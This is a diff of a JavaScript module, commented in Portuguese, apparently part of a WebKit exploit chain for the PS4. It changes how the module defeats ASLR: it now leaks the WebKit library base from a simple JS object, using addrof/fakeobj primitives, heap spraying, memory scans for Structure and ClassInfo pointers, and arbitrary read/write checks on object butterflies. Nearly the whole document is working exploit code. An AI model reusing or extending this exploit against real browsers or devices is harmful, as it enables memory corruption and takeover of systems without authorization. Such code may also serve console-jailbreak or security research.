@@ -1,9 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v120 - R60 Final com Verificação e Robustez Máxima e SCANNER de OFFSET da Structure, C/ TESTE ARB_RW)
+// js/script3/testArrayBufferVictimCrash.mjs (v121 - R60 Final com Vazamento de ASLR via JSObject Simples)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA TODAS AS PRIMITIVAS (ADDROF/FAKEOBJ, ARB_READ/ARB_WRITE) DO core_exploit.mjs para maior estabilidade e clareza.
-// - **ADICIONADO: Scanner de offsets para a Structure* do JSCell do Uint8Array, para maior adaptabilidade.**
-// - **ADICIONADO: Execução inicial de selfTestOOBReadWrite para validar primitivas arb_read/arb_write.**
+// - **Vazamento de ASLR agora realizado com um OBJETO LITERAL SIMPLES, dado o sucesso das primitivas addrof/fakeobj com ele.**
 // - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
 // - Spray volumoso e persistente.
 // - Verificação e validação contínuas em cada etapa crítica.
@@ -28,7 +27,7 @@ import {
 
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v120_R60_ASLR_LEAK_CLEANER_SCANNER_ARB_TEST"; // Renamed for clarity and scanner
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v121_R60_ASLR_LEAK_JSObject_SIMPLE"; // Renamed for clarity and strategy change
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -37,13 +36,16 @@ const LOCAL_LONG_PAUSE = 1000;
 let global_spray_objects = []; // Para heap grooming
 
 // Sprays locais usados na Fase 4 (agora declarados no escopo do módulo para limpeza no finally)
+// Estes sprays não serão mais usados para o vazamento de ASLR direto, mas para grooming geral do heap.
 let pre_typed_array_spray = [];
 let post_typed_array_spray = [];
 
-// Função para escanear offsets potenciais para a Structure*
-async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM, typed_array_addr) {
+
+// Esta função de scanner agora se torna menos crítica se usarmos objetos simples para o vazamento.
+// Manter por enquanto, mas se o vazamento com objeto simples funcionar, ela pode ser removida ou adaptada.
+async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM, object_addr) {
     const FNAME = 'scanForStructurePointerAndLeak';
-    logFn(`[SCANNER] Iniciando scanner de offsets para a Structure* do Uint8Array em ${typed_array_addr.toString(true)}...`, "subtest", FNAME);
+    logFn(`[SCANNER] Iniciando scanner de offsets para a Structure* do objeto em ${object_addr.toString(true)}...`, "subtest", FNAME);
 
     const SCAN_RANGE_START = 0x0;
     const SCAN_RANGE_END = 0x100; // Escanear até 256 bytes. Pode ser ajustado.
@@ -52,9 +54,13 @@ async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM,
     let scan_results = [];
 
     const S_INFO_OFFSET_FROM_BASE_ADV = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
+    // NOTA: JSC::JSArrayBufferView::s_info é para ArrayBufferView. Se estamos vazando de um JSObject,
+    // precisaríamos do s_info do JSObject (ex: JSC::JSObject::s_info) para uma validação precisa aqui.
+    // Para este scanner, vamos focar em encontrar o ponteiro da Structure, e a base WebKit será validada depois.
+
 
     for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += STEP_SIZE) {
-        let current_scan_address = typed_array_addr.add(offset);
+        let current_scan_address = object_addr.add(offset);
         let read_value = null;
         try {
             read_value = await arb_read(current_scan_address, 8); // Ler 8 bytes (um ponteiro)
@@ -66,6 +72,7 @@ async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM,
                 read_value.high() !== 0x7ff80000 // Descartar NaN doubles
             ) {
                 // Tentativa de ler o ClassInfo* do que parece ser uma Structure*
+                // Usando o offset de ClassInfo dentro da Structure.
                 const class_info_ptr_candidate_addr = read_value.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
                 const class_info_ptr_candidate = await arb_read(class_info_ptr_candidate_addr, 8); // Ler o ClassInfo*
 
@@ -75,21 +82,22 @@ async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM,
                     class_info_ptr_candidate.high() !== 0x7ff80000
                 ) {
                     // Calculo da base WebKit com base no ClassInfo* e offset conhecido de s_info
-                    let calculated_webkit_base = class_info_ptr_candidate.sub(S_INFO_OFFSET_FROM_BASE_ADV);
+                    // NOTA: O offset s_info aqui (JSArrayBufferView::s_info) NÃO é o correto para JSObject::s_info.
+                    // Isso é apenas para ver se o valor lido se alinha com QUALQUER base WebKit conhecida.
+                    // Poderíamos usar JSC::JSObject::s_info se estivesse em config.mjs.
+                    let calculated_webkit_base = class_info_ptr_candidate.sub(S_INFO_OFFSET_FROM_BASE_ADV); // Esta linha usará o offset de ArrayBufferView::s_info.
 
                     // Heurística de ASLR para WebKit base no PS4 (últimos 12 bits devem ser zero ou pequenos)
-                    // Ajuste esta heurística se necessário para o seu ambiente.
                     const is_likely_webkit_base = (calculated_webkit_base.low() & 0xFFF) === 0x000;
 
                     if (is_likely_webkit_base) {
-                        logFn(`[SCANNER] CANDIDATO FORTE! Offset: 0x${offset.toString(16).padStart(2, '0')}. Structure*: ${read_value.toString(true)}, ClassInfo*: ${class_info_ptr_candidate.toString(true)}, Base WebKit Calculada: ${calculated_webkit_base.toString(true)}`, "vuln", FNAME);
+                        logFn(`[SCANNER] CANDIDATO FORTE! Offset: 0x${offset.toString(16).padStart(2, '0')}. Structure*: ${read_value.toString(true)}, ClassInfo*: ${class_info_ptr_candidate.toString(true)}, Base WebKit Calculada (usando offset de ABView): ${calculated_webkit_base.toString(true)}`, "vuln", FNAME);
                         scan_results.push({
                             offset: offset,
                             structure_ptr: read_value,
                             class_info_ptr: class_info_ptr_candidate,
                             webkit_base: calculated_webkit_base
                         });
-                        // Não parar aqui, para listar todos os possíveis candidatos dentro do range
                     } else {
                         logFn(`[SCANNER] Candidato (offset 0x${offset.toString(16).padStart(2, '0')}): Structure*: ${read_value.toString(true)}, ClassInfo*: ${class_info_ptr_candidate.toString(true)}, Base WebKit Calculada (IGNORADO - não alinhado): ${calculated_webkit_base.toString(true)}`, "debug", FNAME);
                     }
@@ -101,8 +109,6 @@ async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM,
             }
         } catch (e) {
             logFn(`[SCANNER] Erro ao ler no offset 0x${offset.toString(16).padStart(2, '0')}: ${e.message}`, "error", FNAME);
-            // Se um erro grave ocorrer (ex: acesso de memória inválido), o arb_read pode se invalidar.
-            // Continuar o loop pode ser arriscado se o ambiente OOB estiver instável.
         }
         await pauseFn(10); // Pequena pausa para evitar sobrecarga
     }
@@ -121,7 +127,7 @@ async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM,
 // Modified to accept logFn, pauseFn, and JSC_OFFSETS
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBufferView, Primitivas Core) ---`, "test");
+    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA JSObject Simples) ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
@@ -130,7 +136,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
-        // --- NOVO PASSO: VALIDAR PRIMITIVAS ARB_READ/ARB_WRITE ---
+        // --- FASE 0: Validar primitivas arb_read/arb_write (já feita no testIsolatedAddrofFakeobjCore, mas re-validar para a cadeia principal é bom) ---
         logFn("--- FASE 0: Validando primitivas arb_read/arb_write com selfTestOOBReadWrite ---", "subtest");
         const arbTestSuccess = await selfTestOOBReadWrite(logFn);
         if (!arbTestSuccess) {
@@ -170,6 +176,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // NEW: Initialize core addrof/fakeobj primitives
+        // Já deve ter sido inicializado e testado no testIsolatedAddrofFakeobjCore, mas é seguro chamar de novo.
         initCoreAddrofFakeobjPrimitives();
         logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");
 
@@ -179,92 +186,92 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`Primitivas de Leitura/Escrita Arbitrária ('arb_read' e 'arb_write') estão prontas e são acessadas diretamente do core_exploit.mjs.`, "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---
-        logFn("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---", "subtest");
+        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA JSObject Simples) ---
+        logFn("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA JSObject Simples) ---", "subtest");
         const leakPrepStartTime = performance.now();
         let webkit_base_address = null;
 
-        logFn("Iniciando vazamento REAL da base ASLR da WebKit através de Uint8Array (esperado mais estável)...", "info");
+        logFn("Iniciando vazamento REAL da base ASLR da WebKit através de um OBJETO LITERAL SIMPLES (mais confiável)...", "info");
 
-        // 1. Criar um Uint8Array como alvo de vazamento para grooming de heap.
-        pre_typed_array_spray = [];
-        for (let i = 0; i < 200; i++) { pre_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }
-        const leak_candidate_typed_array = new Uint8Array(0x1000); // 4096 bytes
-        post_typed_array_spray = [];
-        for (let i = 0; i < 200; i++) { post_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }
-
-        logFn(`Objeto Uint8Array criado para vazamento de ClassInfo.`, "debug");
-        leak_candidate_typed_array.fill(0xAA);
-        logFn(`Uint8Array preenchido com 0xAA.`, "debug");
+        // 1. Criar um objeto literal simples como alvo de vazamento.
+        const leak_candidate_js_object = { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6, g: 7, h: 8 }; // Um JSObject simples
+        logFn(`Objeto JS simples criado para vazamento de ClassInfo.`, "debug");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // 2. Obter o endereço de memória do Uint8Array (este é o JSCell do Uint8Array)
-        const typed_array_addr = addrof_core(leak_candidate_typed_array); // Usar primitiva addrof_core
-        logFn(`[REAL LEAK] Endereço do Uint8Array (JSCell): ${typed_array_addr.toString(true)}`, "leak");
+        // 2. Obter o endereço de memória do objeto JS (este é o JSCell do JSObject)
+        const js_object_addr = addrof_core(leak_candidate_js_object); // Usar primitiva addrof_core
+        logFn(`[REAL LEAK] Endereço do JS Object (JSCell): ${js_object_addr.toString(true)}`, "leak");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- CHAMADA DO SCANNER para encontrar o offset da Structure* ---
-        logFn(`[REAL LEAK] Chamando scanner para encontrar o offset da Structure*...`, "info");
+        // --- Chamada do scanner (opcional aqui, mas útil para confirmar offsets) ---
+        // Se quisermos continuar escaneando o objeto, podemos fazê-lo.
+        // No entanto, agora que sabemos que addrof_core e fakeobj_core funcionam para JSObjects simples,
+        // podemos confiar no JSCell.STRUCTURE_POINTER_OFFSET: 0x8.
+        // O scanner pode ser usado para confirmar se 0x8 é o offset correto para JSObjects.
+        logFn(`[REAL LEAK] Chamando scanner (opcional) para confirmar o offset da Structure* do JS Object...`, "info");
         const scan_result = await scanForStructurePointerAndLeak(
             logFn,
             pauseFn,
             JSC_OFFSETS_PARAM,
-            typed_array_addr
+            js_object_addr
         );
-
         let structure_offset_to_use = JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET; // Offset padrão do config.mjs
-        let discovered_webkit_base_from_scanner = null;
-
-        if (scan_result && scan_result.webkit_base) {
-            logFn(`[REAL LEAK] Scanner encontrou um offset provável para a Structure*: 0x${scan_result.offset.toString(16)}. Usando este offset e a base WebKit descoberta.`, "good");
+        if (scan_result && scan_result.offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
+            logFn(`[REAL LEAK] Scanner confirmou o offset da Structure*: 0x${scan_result.offset.toString(16)}.`, "good");
+        } else if (scan_result) {
+            logFn(`[REAL LEAK] Scanner sugeriu um offset diferente para Structure*: 0x${scan_result.offset.toString(16)}. Usando o offset sugerido.`, "warn");
             structure_offset_to_use = scan_result.offset;
-            discovered_webkit_base_from_scanner = scan_result.webkit_base;
         } else {
-            logFn(`[REAL LEAK] Scanner não encontrou um offset promissor. Revertendo para o offset padrão 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do config.mjs.`, "warn");
-            // Se o scanner falhar, a lógica continuará com o offset padrão e tentará o vazamento como antes.
+            logFn(`[REAL LEAK] Scanner não encontrou um offset promissor para o JS Object. Revertendo para o offset padrão 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do config.mjs.`, "warn");
         }
 
-        // 3. Ler o ponteiro para a Structure* do Uint8Array (JSCell) usando o offset (descoberto ou padrão)
-        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* no offset 0x${structure_offset_to_use.toString(16)} do Uint8Array base (JSCell)...`, "info");
 
-        const structure_pointer_address = typed_array_addr.add(structure_offset_to_use);
-        const typed_array_structure_ptr = await arb_read(structure_pointer_address, 8); // Usar arb_read direto
-        logFn(`[REAL LEAK] Lido de ${structure_pointer_address.toString(true)}: ${typed_array_structure_ptr.toString(true)}`, "debug");
+        // 3. Ler o ponteiro para a Structure* do JS Object (JSCell)
+        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* no offset 0x${structure_offset_to_use.toString(16)} do JS Object base (JSCell)...`, "info");
 
-        if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
-            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Uint8Array (offset 0x${structure_offset_to_use.toString(16)}). Endereço inválido: ${typed_array_structure_ptr ? typed_array_structure_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
+        const structure_pointer_address = js_object_addr.add(structure_offset_to_use);
+        const js_object_structure_ptr = await arb_read(structure_pointer_address, 8); // Usar arb_read direto
+        logFn(`[REAL LEAK] Lido de ${structure_pointer_address.toString(true)}: ${js_object_structure_ptr.toString(true)}`, "debug");
+
+        if (!isAdvancedInt64Object(js_object_structure_ptr) || js_object_structure_ptr.equals(AdvancedInt64.Zero) || js_object_structure_ptr.equals(AdvancedInt64.NaNValue)) {
+            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do JS Object (offset 0x${structure_offset_to_use.toString(16)}). Endereço inválido: ${js_object_structure_ptr ? js_object_structure_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
-        logFn(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${typed_array_structure_ptr.toString(true)}`, "leak");
+        logFn(`[REAL LEAK] Ponteiro para a Structure* do JS Object: ${js_object_structure_ptr.toString(true)}`, "leak");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // 4. Calcular o endereço base do WebKit
-        if (discovered_webkit_base_from_scanner) {
-            // Se o scanner já encontrou uma base válida, usamos ela diretamente.
-            webkit_base_address = discovered_webkit_base_from_scanner;
-            logFn(`[REAL LEAK] BASE REAL DA WEBKIT (VALIDADA PELO SCANNER): ${webkit_base_address.toString(true)}`, "leak");
-        } else {
-            // Se o scanner não encontrou, tentamos calcular com o offset padrão da ClassInfo
-            const class_info_ptr = await arb_read(typed_array_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET), 8); // Usar arb_read direto
-            if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
-                const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Uint8Array's Structure. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
-                logFn(errorMsg, "critical");
-                throw new Error(errorMsg);
-            }
-            logFn(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::JSArrayBufferView::s_info): ${class_info_ptr.toString(true)}`, "leak");
-            await pauseFn(LOCAL_SHORT_PAUSE);
-
-            const S_INFO_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
-            webkit_base_address = class_info_ptr.sub(S_INFO_OFFSET_FROM_BASE);
-            logFn(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA: ${webkit_base_address.toString(true)}`, "leak");
+        // 4. Ler o ponteiro para a ClassInfo* da Structure do JS Object
+        const class_info_ptr = await arb_read(js_object_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET), 8); // Usar arb_read direto
+        if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
+            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do JS Object's Structure. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
+            logFn(errorMsg, "critical");
+            throw new Error(errorMsg);
         }
+        // NOTA: Para JSObject, o s_info correto seria JSC::JSObject::s_info, que não está no config.mjs.
+        // Vamos usar JSC::JSArrayBufferView::s_info como uma HEURÍSTICA temporária para tentar vazamento da base.
+        // Idealmente, você precisaria do offset real de JSC::JSObject::s_info.
+        logFn(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::JSObject::s_info, usando JSC::JSArrayBufferView::s_info para cálculo): ${class_info_ptr.toString(true)}`, "leak");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
+        // 5. Calcular o endereço base do WebKit
+        // Usar o offset de JSC::JSArrayBufferView::s_info para o cálculo.
+        // Se este funcionar, é uma coincidência ou o ASLR está menos granular.
+        // Se não funcionar, teremos que encontrar o offset real de JSC::JSObject::s_info no firmware.
+        const S_INFO_OFFSET_FOR_CALC = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
+        webkit_base_address = class_info_ptr.sub(S_INFO_OFFSET_FOR_CALC);
+
+        logFn(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA (usando offset de JSArrayBufferView::s_info): ${webkit_base_address.toString(true)}`, "leak");
+
+        // Validação da base WebKit: A base deve ter os 12 bits inferiores zerados (alinhamento de página)
+        if ((webkit_base_address.low() & 0xFFF) === 0x000) { // Heurística de alinhamento de página
+             logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA JSObject (passou heurística de alinhamento).", "good");
+        } else {
+             logFn("ALERTA: Endereço base REAL da WebKit OBTIDO VIA JSObject NÃO passou heurística de alinhamento. Pode estar incorreto.", "warn");
+        }
 
         if (webkit_base_address.equals(AdvancedInt64.Zero)) {
             throw new Error("[REAL LEAK] Endereço base da WebKit calculado resultou em zero. Vazamento pode ter falhado (offset de s_info incorreto?).");
-        } else {
-            logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA Uint8Array.", "good");
         }
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
@@ -281,46 +288,66 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
         const rwTestPostLeakStartTime = performance.now();
 
-        const test_obj_post_leak = global_spray_objects[5001];
+        const test_obj_post_leak = global_spray_objects[5001]; // Usar um objeto do spray
         logFn(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento.`, "info");
 
-        // Para ler/escrever propriedades de um objeto JS, ainda precisamos do addrof/fakeobj e offsets do JSCell/Butterfly.
-        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak); // Usar addrof_core
+        // Ler o endereço do objeto do spray
+        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
         logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
 
         const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
-        const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET); // Offset da propriedade "a"
-
-        logFn(`Executando arb_write (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        await arb_write(prop_a_addr_post_leak, value_to_write_post_leak, 8); // Usar arb_write direto
-        logFn(`Escrita do valor de teste (Pós-Vazamento) concluída.`, "info");
-
-        logFn(`Executando arb_read (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        const value_read_post_leak = await arb_read(prop_a_addr_post_leak, 8); // Usar arb_read direto
-        logFn(`>>>>> VALOR LIDO DE VOLTA (Pós-Vazamento): ${value_read_post_leak.toString(true)} <<<<<`, "leak");
-
-        if (!value_read_post_leak.equals(value_to_write_post_leak)) {
-            throw new Error(`A verificação de L/E falhou pós-vazamento. Escrito: ${value_to_write_post_leak.toString(true)}, Lido: ${value_read_post_leak.toString(true)}`);
+        // Butterfly offset é para propriedades que NÃO são in-line.
+        // Para JSObjects simples (como o criado para vazamento), as primeiras propriedades são in-line.
+        // O offset 0x10 do JSObject é o BUTTERFLY_OFFSET, que aponta para o armazenamento de propriedades fora da estrutura in-line.
+        // Para acessar 'a', 'b', 'c' de {a:1, b:2, c:3}, precisaríamos de um offset específico das propriedades in-line.
+        // Por simplicidade, vamos tentar escrever no BUTTERFLY_OFFSET, embora isso possa corromper o butterfly.
+        // Para um teste funcional, vamos usar o objeto falsificado criado anteriormente.
+        logFn(`Usando o objeto falsificado para teste de R/W pós-vazamento ASLR para maior segurança.`, 'info');
+        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak); // Recriar um fakeobj para o objeto do spray
+        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
+            throw new Error("Falha ao recriar fakeobj para teste pós-vazamento ASLR.");
         }
+
+        // Tentar escrever e ler uma propriedade do objeto do spray via faked_obj
+        const original_val_prop = test_obj_post_leak.val1;
+        logFn(`Valor original de 'val1' no objeto de spray: ${toHex(original_val_prop)}`, 'debug');
+
+        faked_obj_for_post_leak_test.val1 = 0x1337BEEF; // Escrever um novo valor na propriedade
+        await pauseFn(LOCAL_SHORT_PAUSE);
+        const read_back_val_prop = faked_obj_for_post_leak_test.val1;
+
+        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
+            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, 'good');
+        } else {
+            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Lido via fakeobj: ${toHex(read_back_val_prop)}.`, 'error');
+            throw new Error("Verificação de R/W pós-vazamento ASLR falhou.");
+        }
+
+
         logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");
 
         logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
         let resistanceSuccessCount_post_leak = 0;
         const numResistanceTests = 5;
-        for (let i = 0; i < numResistanceTests; i++) {
-            const test_value = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
-            try {
-                await arb_write(prop_a_addr_post_leak, test_value, 8); // Usar arb_write direto
-                const read_back_value = await arb_read(prop_a_addr_post_leak, 8); // Usar arb_read direto
+        // Agora, vamos usar arb_read/arb_write com um endereço "real" de um objeto,
+        // por exemplo, lendo e escrevendo no Butterfly de um objeto do spray.
+        // Este é um teste mais "real" de arb_read/write após o vazamento de ASLR.
+        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
 
-                if (read_back_value.equals(test_value)) {
+        for (let i = 0; i < numResistanceTests; i++) {
+            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
+            try {
+                await arb_write(butterfly_addr_of_spray_obj, test_value_arb_rw, 8); // Escreve no butterfly
+                const read_back_value_arb_rw = await arb_read(butterfly_addr_of_spray_obj, 8); // Lê do butterfly
+
+                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                     resistanceSuccessCount_post_leak++;
-                    logFn(`[Resistência Pós-Vazamento #${i}] SUCESSO: L/E consistente.`, "debug");
+                    logFn(`[Resistência Pós-Vazamento #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                 } else {
-                    logFn(`[Resistência Pós-Vazamento #${i}] FALHA: L/E inconsistente. Escrito: ${test_value.toString(true)}, Lido: ${read_back_value.toString(true)}`, "error");
+                    logFn(`[Resistência Pós-Vazamento #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Escrito: ${test_value_arb_rw.toString(true)}, Lido: ${read_back_value_arb_rw.toString(true)}.`, "error");
                 }
             } catch (resErr) {
-                logFn(`[Resistência Pós-Vazamento #${i}] ERRO: Exceção durante L/E: ${resErr.message}`, "error");
+                logFn(`[Resistência Pós-Vazamento #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
             }
             await pauseFn(10);
         }
